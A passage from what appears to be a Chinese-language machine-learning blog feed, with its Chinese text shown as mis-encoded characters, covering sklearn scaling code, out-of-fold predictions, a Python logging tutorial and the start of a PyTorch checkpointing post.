src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/0.png"><br>ä½¿ç”¨1.StandardScaler()ç¼©æ”¾ï¼Œç»“æœä¸ºï¼š<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/1.png"><br>ä½¿ç”¨2.MinMaxScaler()ç¼©æ”¾ï¼Œç»“æœä¸ºï¼š<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/2.png"><br>ä½¿ç”¨3.MaxAbsScaler()ç¼©æ”¾ï¼Œç»“æœä¸ºï¼š<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/3.png"><br>ä½¿ç”¨4.Normalizer()ç¼©æ”¾ï¼Œç»“æœä¸ºï¼š<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/4.png"><br>æŒ‰éœ€é€‰æ‹©ã€‚<br>é™„ï¼š</p><h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> preprocessing</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plot</span>(<span class="params">data, title</span>):</span></span><br><span class="line">    sns.set_style(<span class="string">&#x27;dark&#x27;</span>)</span><br><span class="line">    f, ax = plt.subplots()</span><br><span class="line">    ax.<span class="built_in">set</span>(ylabel=<span class="string">&#x27;frequency&#x27;</span>)</span><br><span class="line">    ax.<span class="built_in">set</span>(xlabel=<span class="string">&#x27;height(blue) / weight(green)&#x27;</span>)</span><br><span class="line">    ax.<span class="built_in">set</span>(title=title)</span><br><span class="line">    sns.distplot(data[:, <span class="number">0</span>:<span class="number">1</span>], color=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">    sns.distplot(data[:, <span class="number">1</span>:<span class="number">2</span>], color=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">    plt.savefig(title + <span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">42</span>)</span><br><span class="line">height = np.random.normal(loc=<span class="number">168</span>, scale=<span class="number">5</span>, size=<span class="number">1000</span>).reshape(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">weight = np.random.normal(loc=<span class="number">70</span>, scale=<span class="number">10</span>, size=<span class="number">1000</span>).reshape(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">original_data = np.concatenate((height, weight), axis=<span class="number">1</span>)</span><br><span class="line">plot(original_data, <span class="string">&#x27;Original&#x27;</span>)</span><br><span class="line"></span><br><span class="line">standard_scaler_data = preprocessing.StandardScaler().fit_transform(original_data)</span><br><span class="line">plot(standard_scaler_data, <span class="string">&#x27;StandardScaler&#x27;</span>)</span><br><span class="line"></span><br><span class="line">min_max_scaler_data = preprocessing.MinMaxScaler().fit_transform(original_data)</span><br><span class="line">plot(min_max_scaler_data, <span class="string">&#x27;MinMaxScaler&#x27;</span>)</span><br><span class="line"></span><br><span class="line">max_abs_scaler_data = preprocessing.MaxAbsScaler().fit_transform(original_data)</span><br><span class="line">plot(max_abs_scaler_data, <span class="string">&#x27;MaxAbsScaler&#x27;</span>)</span><br><span class="line"></span><br><span class="line">normalizer_data = preprocessing.Normalizer().fit_transform(original_data)</span><br><span class="line">plot(normalizer_data, <span class="string">&#x27;Normalizer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">robust_scaler_data = preprocessing.RobustScaler().fit_transform(original_data)</span><br><span class="line">plot(robust_scaler_data, <span class="string">&#x27;RobustScaler&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="æ¥æº"><a href="#æ¥æº" class="headerlink" title="æ¥æº"></a>æ¥æº</h2><p>â€‹<a href="https://www.zhihu.com/question/20467170/answer/839255695">https://www.zhihu.com/question/20467170/answer/839255695</a></p>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»€ä¹ˆæ˜¯oof_predictions</title>
      <link href="/2021/08/09/%E4%BB%80%E4%B9%88%E6%98%AFoof_predictions/"/>
      <url>/2021/08/09/%E4%BB%80%E4%B9%88%E6%98%AFoof_predictions/</url>
      
        <content type="html"><![CDATA[<blockquote><p>oof = out of fold</p></blockquote><p>  ä¸€å¥è¯å°±æ˜¯ï¼Œè¿›è¡Œ10æŠ˜éªŒè¯çš„æ—¶å€™ï¼Œå‡å¦‚è®­ç»ƒé›†1000æ¡ï¼š</p><ul><li>åæŠ˜cvï¼Œ10ä¸ªæ¨¡å‹ï¼Œæ¯ä¸ªæ¨¡å‹éƒ½æ˜¯ç”±900æ¡è®­ç»ƒé›†è®­ç»ƒè€Œæˆï¼Œå¯¹å‰©ä¸‹çš„100æ¡è¿›è¡Œé¢„æµ‹ï¼Œ10ä¸ªæ¨¡å‹éƒ½å¯¹å„è‡ªå‰©ä¸‹çš„100æ¡è¿›è¡Œé¢„æµ‹ï¼Œè¿™ä¸ªå°±å«åšOOF predictions.</li></ul>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonæ ‡å‡†åº“loggingæ•™ç¨‹</title>
      <link href="/2021/08/08/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/"/>
      <url>/2021/08/08/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?aid=883945077&cid=213322412&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="æ—¥å¿—çº§åˆ«"><a href="#æ—¥å¿—çº§åˆ«" class="headerlink" title="æ—¥å¿—çº§åˆ«"></a>æ—¥å¿—çº§åˆ«</h2><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/0.png"></p><blockquote><p>é»˜è®¤æ˜¯WARNINGï¼ŒæŠ•å…¥ç”Ÿäº§ç¯å¢ƒå¯ä»¥åªè¾“å‡ºå¤§äºINFOçº§åˆ«çš„æ—¥å¿—</p></blockquote><h2 id="ç®€å•å®ä¾‹"><a href="#ç®€å•å®ä¾‹" class="headerlink" title="ç®€å•å®ä¾‹"></a>ç®€å•å®ä¾‹</h2><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/1.png"><br>å¯ä»¥æŒ‡å®šè¾“å‡ºçº§åˆ«ï¼š<br>ä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br></pre></td></tr></table></figure><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/2.png"></p><blockquote><p>loggingä¹‹é—´çš„è¾“å‡ºé¡ºåºæ˜¯ä¸€å®šæŒ‰é¡ºåºçš„ï¼Œä½†æ˜¯å’Œprint()çš„è¾“å‡ºé¡ºåºæ˜¯ä¸å›ºå®šçš„</p></blockquote><p>å…¶ä¸­ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/3.png"><br>ä¸ºè®°å½•å™¨</p><h2 id="å°†æ—¥å¿—è¾“å‡ºä¿å­˜åˆ°logæ–‡ä»¶"><a href="#å°†æ—¥å¿—è¾“å‡ºä¿å­˜åˆ°logæ–‡ä»¶" class="headerlink" title="å°†æ—¥å¿—è¾“å‡ºä¿å­˜åˆ°logæ–‡ä»¶"></a>å°†æ—¥å¿—è¾“å‡ºä¿å­˜åˆ°logæ–‡ä»¶</h2><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/4.png"><br>é»˜è®¤æ¨¡å¼æ˜¯è¿½åŠ æ¨¡å¼ï¼Œå¦‚æœä¸æƒ³è¿½åŠ ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/5.png"><br>å³å…ˆæ¸…ç©ºå†å†™å…¥</p><h2 id="å‘æ—¥å¿—è¾“å‡ºå˜é‡"><a href="#å‘æ—¥å¿—è¾“å‡ºå˜é‡" class="headerlink" title="å‘æ—¥å¿—è¾“å‡ºå˜é‡"></a>å‘æ—¥å¿—è¾“å‡ºå˜é‡</h2><p>å¦‚ä¸‹ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/6.png"><br><strong>ä¹Ÿå¯ä»¥ç”¨%è¿ç®—ç¬¦æ¥ä¼ é€’å˜é‡ï¼š</strong><br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/7.png"><br>.format(å…ƒç»„)ä¹Ÿæ˜¯å¯ä»¥çš„ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/8.png"><br>æˆ–è€…å¯ä»¥å­—ç¬¦ä¸²å‰åŠ fï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/9.png">â€‹</p><h2 id="æŒ‡å®šå…¬å…±ä¿¡æ¯"><a href="#æŒ‡å®šå…¬å…±ä¿¡æ¯" class="headerlink" title="æŒ‡å®šå…¬å…±ä¿¡æ¯"></a>æŒ‡å®šå…¬å…±ä¿¡æ¯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%()s</span><br></pre></td></tr></table></figure><p>å°†æƒ³è¦æ·»åŠ çš„å…¬å…±ä¿¡æ¯å†™åœ¨()ä¸­å³å¯ï¼Œå¦‚ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/10.png"></p><h2 id="loggingé«˜çº§åº”ç”¨"><a href="#loggingé«˜çº§åº”ç”¨" class="headerlink" title="loggingé«˜çº§åº”ç”¨"></a>loggingé«˜çº§åº”ç”¨</h2><p>loggingæ¨¡å—é‡‡ç”¨äº†æ¨¡å—åŒ–è®¾è®¡ï¼Œä¸»è¦åŒ…å«å››ç§ç»„ä»¶:</p><ul><li>Loggers:è®°å½•å™¨ï¼Œæä¾›åº”ç”¨ç¨‹åºä»£ç èƒ½ç›´æ¥ä½¿ç”¨çš„æ¥å£; </li><li>Handlers: å¤„ç†å™¨ï¼Œå°†è®°å½•å™¨äº§ç”Ÿçš„æ—¥å¿—å‘é€è‡³ç›®çš„åœ°; </li><li>Filters: è¿‡æ»¤å™¨ï¼Œæä¾›æ›´å¥½çš„ç²’åº¦æ§åˆ¶ï¼Œå†³å®šå“ªäº›æ—¥å¿—ä¼šè¢«è¾“å‡ºï¼› </li><li>Formatters: æ ¼å¼åŒ–å™¨ï¼Œè®¾ç½®æ—¥å¿—å†…å®¹çš„ç»„æˆç»“æ„å’Œæ¶ˆæ¯å­—æ®µã€‚<h3 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h3><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/11.png"><h3 id="è®°å½•å™¨"><a href="#è®°å½•å™¨" class="headerlink" title="è®°å½•å™¨"></a>è®°å½•å™¨</h3><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/12.png"><h3 id="Handlerså¤„ç†å™¨"><a href="#Handlerså¤„ç†å™¨" class="headerlink" title="Handlerså¤„ç†å™¨"></a>Handlerså¤„ç†å™¨</h3>å®ƒä»¬å°†æ—¥å¿—åˆ†å‘åˆ°ä¸åŒçš„ç›®çš„åœ°ã€‚å¯ä»¥æ˜¯æ–‡ä»¶ã€æ ‡å‡†è¾“å‡ºã€ é‚®ä»¶ã€æˆ–è€…é€šè¿‡socketã€ httpç­‰åè®®å‘é€åˆ°ä»»ä½•åœ°æ–¹ã€‚<br>æœ‰ä»¥ä¸‹å®ä¾‹ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/13.png"><br>encodingï¼šæŒ‡å®šå­—ç¬¦é›†<br>delayï¼šæŒ‡å®šç¼“å­˜</li></ul><p><strong>æ‰€æœ‰çš„handleréƒ½å¯ä»¥ç”¨setFormatter()è®¾ç½®å½“å‰handlerå¯¹è±¡ä½¿ç”¨çš„æ¶ˆæ¯æ ¼å¼</strong>â€‹<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/14.png"><br>TimedRotatingFileHandlerå¯ä»¥æ ¹æ®æ—¶é—´ç”Ÿæˆå¯¹åº”çš„logæ–‡ä»¶ï¼Œé¿å…ä¸€ä¸ªlogæ–‡ä»¶è¿‡å¤§</p><h3 id="Formattersæ ¼å¼"><a href="#Formattersæ ¼å¼" class="headerlink" title="Formattersæ ¼å¼"></a>Formattersæ ¼å¼</h3><p>Formatterå¯¹è±¡ç”¨æ¥æœ€ç»ˆè®¾ç½®æ—¥å¿—ä¿¡æ¯çš„é¡ºåºã€ç»“æ„å’Œå†…å®¹ã€‚<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/15.png"><br>å¯æ·»åŠ çš„å…¬å…±ä¿¡æ¯å­—ç¬¦ä¸²åŒ…æ‰©ä»¥ä¸‹ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/16.png"></p><h3 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><h4 id="ç”Ÿæˆè®°å½•å™¨"><a href="#ç”Ÿæˆè®°å½•å™¨" class="headerlink" title="ç”Ÿæˆè®°å½•å™¨"></a>ç”Ÿæˆè®°å½•å™¨</h4><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/17.png"></p><h4 id="æ›´æ”¹æ—¥å¿—çº§åˆ«"><a href="#æ›´æ”¹æ—¥å¿—çº§åˆ«" class="headerlink" title="æ›´æ”¹æ—¥å¿—çº§åˆ«"></a>æ›´æ”¹æ—¥å¿—çº§åˆ«</h4><p>ä½¿ç”¨setLevel()<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/18.png"></p><h4 id="ç”Ÿæˆhandler"><a href="#ç”Ÿæˆhandler" class="headerlink" title="ç”Ÿæˆhandler"></a>ç”Ÿæˆhandler</h4><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/19.png"></p><h4 id="ç”Ÿæˆformatter"><a href="#ç”Ÿæˆformatter" class="headerlink" title="ç”Ÿæˆformatter"></a>ç”Ÿæˆformatter</h4><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/20.png"></p><h4 id="ç»™handlerå¤„ç†å™¨è®¾ç½®æ ¼å¼"><a href="#ç»™handlerå¤„ç†å™¨è®¾ç½®æ ¼å¼" class="headerlink" title="ç»™handlerå¤„ç†å™¨è®¾ç½®æ ¼å¼"></a>ç»™handlerå¤„ç†å™¨è®¾ç½®æ ¼å¼</h4><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/21.png"></p><h4 id="loggerè®°å½•å™¨è®¾ç½®handlerå¤„ç†å™¨"><a href="#loggerè®°å½•å™¨è®¾ç½®handlerå¤„ç†å™¨" class="headerlink" title="loggerè®°å½•å™¨è®¾ç½®handlerå¤„ç†å™¨"></a>loggerè®°å½•å™¨è®¾ç½®handlerå¤„ç†å™¨</h4><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/22.png">â€‹</p><h4 id="æ‰“å°æ—¥å¿—çš„ä»£ç "><a href="#æ‰“å°æ—¥å¿—çš„ä»£ç " class="headerlink" title="æ‰“å°æ—¥å¿—çš„ä»£ç "></a>æ‰“å°æ—¥å¿—çš„ä»£ç </h4><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/23.png"></p><h4 id="æ—¥å¿—ç­‰çº§å…³ç³»"><a href="#æ—¥å¿—ç­‰çº§å…³ç³»" class="headerlink" title="æ—¥å¿—ç­‰çº§å…³ç³»"></a>æ—¥å¿—ç­‰çº§å…³ç³»</h4><p>handlerçš„setlevelè®¾ç½®çš„æ˜¯è¿™ä¸ªå¤„ç†å™¨ç”Ÿæˆçš„æ—¥å¿—çº§åˆ«ï¼Œä¸Šé¢çš„loggerè®¾ç½®çš„æ˜¯è¾“å‡ºçº§åˆ«ã€‚<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/24.png"><br>æ§åˆ¶å°è¾“å‡ºï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/25.png"><br>æ–‡ä»¶è¾“å‡ºï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/26.png"></p><blockquote><p>è¾“å‡ºä¸­æ²¡æœ‰å¯¹é½ï¼Œå¯ä»¥é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥å¯¹é½ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/27.png"><br>ï¼ˆæ•°å­—8å‰åŠ â€˜-â€™å¯ä»¥å·¦å¯¹é½ï¼‰</p></blockquote><h3 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h3><blockquote><p>ä»¥è®°å½•å™¨çš„åå­—æ¥è¿‡æ»¤</p></blockquote><h4 id="å®šä¹‰è¿‡æ»¤å™¨"><a href="#å®šä¹‰è¿‡æ»¤å™¨" class="headerlink" title="å®šä¹‰è¿‡æ»¤å™¨"></a>å®šä¹‰è¿‡æ»¤å™¨</h4><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/28.png"><br>å½“å‰loggerå«åšï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/29.png"><br>æ‰€ä»¥è¢«è¿‡æ»¤æ‰äº†ï¼Œè¾“å‡ºä¸ºï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/30.png"><br>å°†æ­¤loggeræ”¹åä¸º<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/31.png"><br>å¯ä»¥çœ‹åˆ°æ­£å¸¸è¾“å‡ºäº†ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/32.png"><br>handlerä¹Ÿå¯ä»¥åŠ ä¸Šè¿‡æ»¤å™¨ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/33.png"><br>æ­¤æ—¶loggerè®¾ç½®ä¸ºï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/34.png"><br>è¾“å‡ºä¸ºï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/35.png"><br>è€Œæ–‡ä»¶é‡Œä¸ºç©º</p><h3 id="ä½¿ç”¨é…ç½®æ–‡ä»¶"><a href="#ä½¿ç”¨é…ç½®æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨é…ç½®æ–‡ä»¶"></a>ä½¿ç”¨é…ç½®æ–‡ä»¶</h3><h4 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h4><blockquote><p>å…¶ä¸­loggerä¸­çš„rootå¿…é¡»ä¿ç•™</p></blockquote><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/36.png"></p><h4 id="è®¾ç½®"><a href="#è®¾ç½®" class="headerlink" title="è®¾ç½®"></a>è®¾ç½®</h4><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/37.png"><br>qualnameç›¸å½“äºgetLogger(â€˜applogâ€™)<br>propagateï¼šç»§æ‰¿å…³ç³»ï¼Œä¸€èˆ¬å†™0<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/38.png"><br>â€˜midnightâ€™æ˜¯æŒ‡æŒ‰æ—¶é—´æ¯å¤©åˆ†å‰²ä¸€æ¬¡logï¼Œå›¾ä¸­è¡¨ç¤ºåˆå¤œè¿‡äº†1ç§’ååˆ†å‰²ï¼Œæœ€åçš„0è¡¨ç¤ºæŒç»­ä¿ç•™ï¼Œè‹¥æƒ³ä¿ç•™30å¤©åˆ™æ”¹æˆ30å³å¯<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/39.png"></p><h4 id="è°ƒç”¨é…ç½®"><a href="#è°ƒç”¨é…ç½®" class="headerlink" title="è°ƒç”¨é…ç½®"></a>è°ƒç”¨é…ç½®</h4><p><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/40.png"><br>è¾“å‡ºï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/41.png"></p><h4 id="è®°å½•å¼‚å¸¸"><a href="#è®°å½•å¼‚å¸¸" class="headerlink" title="è®°å½•å¼‚å¸¸"></a>è®°å½•å¼‚å¸¸</h4><p>è®°å½•å¼‚å¸¸éœ€è¦ä¿ç•™å‘ç”Ÿå¼‚å¸¸çš„æ ˆä¿¡æ¯ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/42.png"><br>æ–‡ä»¶é‡Œï¼š<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/43.png"></p><h3 id="å­—å…¸æ–¹å¼çš„é…ç½®"><a href="#å­—å…¸æ–¹å¼çš„é…ç½®" class="headerlink" title="å­—å…¸æ–¹å¼çš„é…ç½®"></a>å­—å…¸æ–¹å¼çš„é…ç½®</h3><p>åªè¦ä¼ å…¥çš„æ ¼å¼æ˜¯å­—å…¸æ ¼å¼ä¸è®ºé…ç½®æ˜¯jsonè¿˜æ˜¯xmlç­‰éƒ½å¯ä»¥è¯»å–<br><img src="https://snowgo.top/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/44.png"></p>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€æ–‡æ¢³ç†pytorchä¿å­˜å’Œé‡è½½æ¨¡å‹å‚æ•°æ”»ç•¥</title>
      <link href="/2021/08/07/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/"/>
      <url>/2021/08/07/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>è®­ç»ƒè¿‡ç¨‹ä¸­ä¿å­˜æ¨¡å‹å‚æ•°ï¼Œå°±ä¸æ€•æ–­ç”µäº†â€”â€”æ²ƒèµ„åŸºÂ·ç´¢å¾·</p></blockquote><p>åœ¨è®­ç»ƒå®Œæˆä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æ¯éš”ä¸€æ®µæ—¶é—´ä¿å­˜æ¨¡å‹å½“å‰å‚æ•°å€¼ï¼Œä¸€æ–¹é¢å¯ä»¥<strong>é˜²æ­¢æ–­ç”µé‡è·‘</strong>ï¼Œå¦ä¸€æ–¹é¢å¯ä»¥<strong>è§‚å¯Ÿä¸åŒè¿­ä»£æ¬¡æ•°æ¨¡å‹çš„è¡¨ç°</strong>ï¼›åœ¨è®­ç»ƒå®Œæˆä»¥åï¼Œæˆ‘ä»¬éœ€è¦ä¿å­˜æ¨¡å‹å‚æ•°å€¼<strong>ç”¨äºåç»­çš„æµ‹è¯•è¿‡ç¨‹</strong>ã€‚æ‰€ä»¥ï¼Œä¿å­˜çš„å¯¹è±¡åŒ…å«ç½‘ç»œå‚æ•°å€¼ã€ä¼˜åŒ–å™¨å‚æ•°å€¼ã€epochå€¼ç­‰ç­‰ã€‚</p><h2 id="ä¸€ã€å®šä¹‰ä¸€ä¸ªå®¹æ˜“è¯†åˆ«çš„ç½‘ç»œ"><a href="#ä¸€ã€å®šä¹‰ä¸€ä¸ªå®¹æ˜“è¯†åˆ«çš„ç½‘ç»œ" class="headerlink" title="ä¸€ã€å®šä¹‰ä¸€ä¸ªå®¹æ˜“è¯†åˆ«çš„ç½‘ç»œ"></a>ä¸€ã€å®šä¹‰ä¸€ä¸ªå®¹æ˜“è¯†åˆ«çš„ç½‘ç»œ</h2><p>åœ¨æ­£å¼ä»‹ç»æ¨¡å‹çš„ä¿å­˜å’ŒåŠ è½½ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆå®šä¹‰ä¸€ä¸ªåŸºæœ¬çš„ç½‘ç»œNetï¼Œå®ƒåªåŒ…å«ä¸€ä¸ªå…¨è¿æ¥å±‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Net</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Net, self).__init__()</span><br><span class="line">        self.layer = nn.Linear(<span class="number">1</span>, <span 